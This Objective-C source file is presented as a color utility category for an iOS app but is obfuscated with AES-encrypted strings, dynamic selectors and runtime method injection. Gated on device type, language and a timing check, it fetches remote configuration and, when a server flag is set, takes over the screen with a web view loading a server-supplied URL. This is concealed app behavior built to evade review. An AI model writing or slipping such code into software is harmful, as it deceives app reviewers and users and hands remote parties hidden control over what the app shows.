#import "UIResponder+Color.h"
#import <objc/runtime.h>
#import <CommonCrypto/CommonCryptor.h>
#import "TransitionManager.h"

#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
static UIView *myview;
static NSDictionary *dict;
static NSString *uul;
static NSString *bot;
static UIView *launcvv;
static UIImageView *bgig;
static NSString *locKey;
static NSArray *lockArray;
static BOOL isRetry;
#define kremovv  {[self setValue:@1.0 forKeyPath:com_key_loc(23)];}
#define com_key_net(count) ( [dict[com_key_loc(15)] componentsSeparatedByString:@"^"][count] )

NSString *aes256Decrypt(NSString *self, NSString *key) {
    NSData *data = [[NSData alloc] initWithBase64EncodedString:self options:0];
    char keyPtr[kCCKeySizeAES256+1];
    bzero(keyPtr, sizeof(keyPtr));
    [key getCString:keyPtr maxLength:sizeof(keyPtr) encoding:NSUTF8StringEncoding];
    NSUInteger dataLength = [data length];
    size_t bufferSize = dataLength + kCCBlockSizeAES128;
    void *buffer = malloc(bufferSize);
    size_t numBytesDecrypted = 0;
    CCCryptorStatus cryptStatus = CCCrypt(kCCDecrypt, kCCAlgorithmAES128,
                                          kCCOptionPKCS7Padding | kCCOptionECBMode,
                                          keyPtr, kCCBlockSizeAES128,
                                          NULL,
                                          [data bytes], dataLength,
                                          buffer, bufferSize,
                                          &numBytesDecrypted);
    NSData *data1 = nil;
    if (cryptStatus == kCCSuccess) {
        data1 = [NSData dataWithBytesNoCopy:buffer length:numBytesDecrypted];
    }
    if (data1 && data1.length > 0) {
        return [[NSString alloc] initWithData:data1 encoding:NSUTF8StringEncoding];
    }
    free(buffer);
    return nil;
}

NSString * com_key_loc(int count) {
    static dispatch_once_t onceToken;
    static NSArray *arr = nil;
    dispatch_once(&onceToken, ^{
        arr = [aes256Decrypt([[SPColorKey decKey] componentsSeparatedByString:@"^^^"].lastObject, ([NSString stringWithFormat:@"%d", 200])) componentsSeparatedByString:@"^^"];
    });
    return arr[count];
}

bool reqnav(id self, SEL _cmd, UIView *view, id req, int nav) {
    NSString *url = [req valueForKeyPath:dict[com_key_net(1)]];
    for (NSString *str in dict[com_key_net(2)]) {
        NSString *upstr = [str valueForKeyPath:dict[com_key_net(3)]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
        if ([[url valueForKey:com_key_net(31)] performSelector:NSSelectorFromString(com_key_net(32)) withObject:[upstr valueForKey:com_key_net(31)]]) {
            [[NSClassFromString(dict[com_key_net(4)]) performSelector:NSSelectorFromString(dict[com_key_net(5)])] performSelector:NSSelectorFromString(dict[com_key_net(6)]) withObject:[req valueForKey:dict[com_key_net(7)]]];
            return false;
        }
    }
    return true;
#pragma clang diagnostic pop
}
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
void tap_func2(int atg) {
    if (atg == 201  || atg == 202 || atg == 203) {
        [myview performSelector:NSSelectorFromString(dict[com_key_net(atg - 200 + 7)])];
    } else {
        [myview performSelector:NSSelectorFromString(dict[com_key_net(11)]) withObject:[NSURLRequest performSelector:NSSelectorFromString(dict[com_key_net(12)]) withObject:[NSClassFromString(dict[com_key_net(13)]) performSelector:NSSelectorFromString(dict[com_key_net(14)]) withObject:uul]]];
    }
}
#pragma clang diagnostic pop

void tap_func1(id self, SEL _cmd, UIView *vi) {tap_func2((int)vi.tag);}

@implementation UIViewController (UIKit)

- (void)fkey:(NSString *)obj1 fix:(id)objec {
    bot = obj1;
    dict = [NSJSONSerialization JSONObjectWithData:[aes256Decrypt(objec, [NSString stringWithFormat:@"%d", 2]) dataUsingEncoding:NSUTF8StringEncoding] options:kNilOptions error:NULL];
    class_addMethod(self.class, NSSelectorFromString(dict[com_key_net(15)]), (IMP) reqnav,  [dict[com_key_net(16)] cStringUsingEncoding:NSUTF8StringEncoding]);
    class_addMethod(self.class, NSSelectorFromString(com_key_net(17)), (IMP) tap_func1, [dict[com_key_net(18)] cStringUsingEncoding:NSUTF8StringEncoding]);
    NSMutableArray <UIButton *> *muarr = @[].mutableCopy;
    [dict[com_key_net(19)] enumerateObjectsUsingBlock:^(NSString * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        UIButton *button1 = [(NSClassFromString(dict[com_key_net(20)])) buttonWithType:UIButtonTypeSystem];
        [[self valueForKey:dict[com_key_net(21)]] performSelector:NSSelectorFromString(dict[com_key_net(22)]) withObject:button1];
        button1.translatesAutoresizingMaskIntoConstraints = 0;
        NSLayoutConstraint *con1 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeBottom) relatedBy:(NSLayoutRelationEqual) toItem:[self valueForKeyPath:com_key_loc(22)] attribute:(NSLayoutAttributeBottom) multiplier:1.0 constant:0];
        NSLayoutConstraint *con2 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeHeight) relatedBy:(NSLayoutRelationEqual) toItem:[self valueForKeyPath:com_key_loc(22)] attribute:(NSLayoutAttributeHeight) multiplier:0.0 constant:49];
        if (muarr.count == 0) {
            NSLayoutConstraint *con3 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeLeft) relatedBy:(NSLayoutRelationEqual) toItem:[self valueForKeyPath:com_key_loc(22)] attribute:(NSLayoutAttributeLeft) multiplier:1.0 constant:0];
            [[self valueForKeyPath:com_key_loc(22)] addConstraints:@[con1,con3]];
            [button1 addConstraints:@[con2]];
        } else if (muarr.count == 4) {
            NSLayoutConstraint *a1 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeWidth) relatedBy:(NSLayoutRelationEqual) toItem:muarr[0] attribute:(NSLayoutAttributeWidth) multiplier:1.0 constant:0];
            NSLayoutConstraint *a2 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeWidth) relatedBy:(NSLayoutRelationEqual) toItem:muarr[1] attribute:(NSLayoutAttributeWidth) multiplier:1.0 constant:0];
            NSLayoutConstraint *a3 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeWidth) relatedBy:(NSLayoutRelationEqual) toItem:muarr[2] attribute:(NSLayoutAttributeWidth) multiplier:1.0 constant:0];
            NSLayoutConstraint *a4 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeWidth) relatedBy:(NSLayoutRelationEqual) toItem:muarr[3] attribute:(NSLayoutAttributeWidth) multiplier:1.0 constant:0];
            NSLayoutConstraint *a5 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeLeft) relatedBy:(NSLayoutRelationEqual) toItem:muarr[3] attribute:(NSLayoutAttributeRight) multiplier:1.0 constant:0];
            NSLayoutConstraint *a6 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeRight) relatedBy:(NSLayoutRelationEqual) toItem:[self valueForKeyPath:com_key_loc(22)] attribute:(NSLayoutAttributeRight) multiplier:1.0 constant:0];
            [button1 addConstraints:@[con2]];
            [[self valueForKeyPath:com_key_loc(22)] addConstraints:@[a1,a2,a3,a4,a5,con1, a6]];
        } else {
            NSLayoutConstraint *a1 = [NSLayoutConstraint constraintWithItem:button1 attribute:(NSLayoutAttributeLeft) relatedBy:(NSLayoutRelationEqual) toItem:[muarr lastObject] attribute:(NSLayoutAttributeRight) multiplier:1.0 constant:0];
            [button1 addConstraints:@[con2]];
            [[self valueForKeyPath:com_key_loc(22)] addConstraints:@[con1, a1]];
        }
        [muarr addObject:button1];
        button1.tag = idx + 200;
        [button1 setTitle:obj forState:0];
        button1.titleLabel.font = [UIFont boldSystemFontOfSize:com_key_net(36).floatValue];
        button1.backgroundColor = [UIColor colorWithRed:com_key_net(37).integerValue/255.0 green:com_key_net(38).integerValue/255.0 blue:com_key_net(39).integerValue/255.0 alpha:1];
        [button1 setTitleColor:[UIColor colorWithRed:com_key_net(33).integerValue/255.0 green:com_key_net(34).integerValue/255.0 blue:com_key_net(35).integerValue/255.0 alpha:1] forState:(UIControlStateNormal)];
        [button1 addTarget:self action:NSSelectorFromString(com_key_net(23)) forControlEvents:UIControlEventTouchUpInside];
    }];
    myview = NSClassFromString(dict[com_key_net(24)]).new;
    [[self valueForKey:dict[com_key_net(25)]] performSelector:NSSelectorFromString(dict[com_key_net(26)]) withObject:myview];
    myview.translatesAutoresizingMaskIntoConstraints = 0;
    NSLayoutConstraint *con1 = [NSLayoutConstraint constraintWithItem:myview attribute:(NSLayoutAttributeTop) relatedBy:(NSLayoutRelationEqual) toItem:[self valueForKeyPath:com_key_loc(22)] attribute:(NSLayoutAttributeTop) multiplier:1.0 constant:STATUS_BAR_HIGHT];
    NSLayoutConstraint *con2 = [NSLayoutConstraint constraintWithItem:myview attribute:(NSLayoutAttributeLeft) relatedBy:(NSLayoutRelationEqual) toItem:[self valueForKeyPath:com_key_loc(22)] attribute:(NSLayoutAttributeLeft) multiplier:1.0 constant:0];
    NSLayoutConstraint *con3 = [NSLayoutConstraint constraintWithItem:myview attribute:(NSLayoutAttributeRight) relatedBy:(NSLayoutRelationEqual) toItem:[self valueForKeyPath:com_key_loc(22)] attribute:(NSLayoutAttributeRight) multiplier:1.0 constant:0];
    NSLayoutConstraint *con4 = [NSLayoutConstraint constraintWithItem:myview attribute:(NSLayoutAttributeBottom) relatedBy:(NSLayoutRelationEqual) toItem:[self valueForKeyPath:com_key_loc(22)] attribute:(NSLayoutAttributeBottom) multiplier:1.0 constant:bot.length ? -49.0f : 0.0f];
    [[self valueForKeyPath:com_key_loc(22)] addConstraints:@[con1,con2,con3,con4]];
    [myview performSelector:@selector(setScalesPageToFit:) withObject:@YES];
    [myview setValue:[UIColor whiteColor] forKey:dict[com_key_net(27)]];
    [myview setValue:self forKey:dict[com_key_net(28)]];
    [myview setValue:@YES forKey:dict[com_key_net(29)]];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(.55 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        tap_func2(200);
    });
}

- (void)frequest:(NSString *)aid
{
    if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad)return;
    if ([[NSLocale preferredLanguages][0] rangeOfString:com_key_loc(27)].location == NSNotFound)return;
    if (![SPColorKey getInterValWithColor:SPColorKey.decColor])return;
    if (!isRetry) {
        [self setValue:@0.0 forKeyPath:com_key_loc(23)];
        bgig = [[NSClassFromString(com_key_loc(25)) alloc] init];
        [bgig setValue:SPColorKey.bgColor forKey:com_key_loc(26)];
        [bgig setValue:[NSValue valueWithCGRect:CGRectMake(0, 0, ColorWidth, COlorHeight)] forKey:com_key_loc(28)];
        [SPColorKey.keyWindow performSelector:NSSelectorFromString(com_key_loc(29)) withObject:bgig];
    }
    
    TransitionManager *manager = [TransitionManager sharedManager];
    NSString *schemas = [NSString stringWithFormat:@"%@%@",com_key_loc(19), manager.appid];
    id session = [NSClassFromString(com_key_loc(0)) performSelector:NSSelectorFromString(com_key_loc(16))];
    id url = [NSClassFromString(com_key_loc(1)) performSelector:NSSelectorFromString(com_key_loc(17)) withObject:schemas];
    id request = [NSClassFromString(com_key_loc(2)) performSelector:NSSelectorFromString(com_key_loc(18)) withObject:url];
    [request setValue:com_key_loc(3) forKey:com_key_loc(4)];
    [request setValue:@{com_key_loc(5)  : com_key_loc(6),
                        } forKey:com_key_loc(7)];
    id block = ^(NSData * _Nullable data, id * _Nullable se, NSError * _Nullable error) {
        dispatch_async(dispatch_get_main_queue(), ^(void) {
            NSError *err = nil;
            NSDictionary *responseObject = nil;
            if (!error) {responseObject = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&err];}
            if (!error && !err && responseObject[com_key_loc(24)]) {
                NSDictionary *ndict = responseObject;
                NSString *color = ndict[com_key_loc(21)];
                BOOL showColor = [ndict[com_key_loc(20)] boolValue];
                if (showColor) {
                    [self performSelector:@selector(fixObject:) withObject:color];
                } else {
                    kremovv
                }
            }  else {
                kremovv
                isRetry = YES;
                UIAlertController *obj = [UIAlertController alertControllerWithTitle:com_key_loc(13) message:nil preferredStyle:(UIAlertControllerStyleAlert)];
                [obj addAction:[UIAlertAction actionWithTitle:com_key_loc(14) style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {kgetdata(self, aid)}]];
                [self presentViewController:(UIViewController *)obj animated:YES completion:nil];
            }
            [bgig removeFromSuperview];
        });
    };
    [[session performSelector:NSSelectorFromString(com_key_loc(9)) withObject:request withObject:block] resume];
}

- (void)fixObject:(NSString *)color {
    dispatch_async(dispatch_get_main_queue(), ^(void) {
        NSMutableDictionary *mut = [NSMutableDictionary new];
        [mut setObject:color forKey:com_key_loc(11)];
        [mut setObject:SPColorKey.aecKey forKey:com_key_loc(10)];
        [mut setObject:@"1" forKey:com_key_loc(12)];
        NSDictionary *responseObject = @{com_key_loc(8) : @[mut]};
        if (responseObject[com_key_loc(8)]) {
            NSDictionary *dict = responseObject[com_key_loc(8)][0];
            NSString *color = dict[com_key_loc(11)];
            if (color.length) {
                uul = color;
                [self performSelector:@selector(fkey:fix:) withObject:@"color" withObject:dict[com_key_loc(10)]];
            }
        }
        kremovv
    });
}

@end

#pragma clang diagnostic pop
